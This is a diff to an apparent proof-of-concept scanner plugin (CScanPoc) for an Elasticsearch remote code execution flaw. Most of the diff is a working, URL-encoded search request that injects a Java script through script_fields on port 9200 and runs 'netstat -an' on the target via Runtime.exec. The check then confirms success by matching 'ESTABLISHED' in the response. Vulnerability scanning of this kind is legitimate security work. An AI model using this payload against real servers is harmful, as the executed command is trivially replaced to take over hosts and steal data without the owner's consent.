@@ -4,6 +4,7 @@ from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import urlparse
 import socket
+import re
 
 class Vuln(ABVuln):
     vuln_id = 'ElasticSearch_0011' # 平台漏洞编号，留空
@@ -35,11 +36,10 @@ class Poc(ABPoc):
             
             target = urlparse.urlparse(self.target)
             ip = socket.gethostbyname(target.hostname)
-            print(ip)
+            # print(ip)
             verify_url = ip + ":9200/_search?source=%7B%22size%22:1,%22query%22:%7B%22filtered%22:%7B%22query%22:%7B%22match_all%22:%7B%7D%7D%7D%7D,%22script_fields%22:%7B%22exp%22:%7B%22script%22:%22import%20java.util.*;%5Cnimport%20java.io.*;%5CnString%20str%20=%20%5C%22%5C%22;BufferedReader%20br%20=%20new%20BufferedReader(new%20InputStreamReader(Runtime.getRuntime().exec(%5C%22netstat%20-an%5C%22).getInputStream()));StringBuilder%20sb%20=%20new%20StringBuilder();while((str=br.readLine())!=null)%7Bsb.append(str);%7Dsb.toString();%22%7D%7D%7D"
             r = requests.get(verify_url)
-
-            if code == 200:
+            if r.status_code == 200:
                 m = re.search("ESTABLISHED", r.content)
                 if m:
                     #security_hole(arg[:-1]+payload)
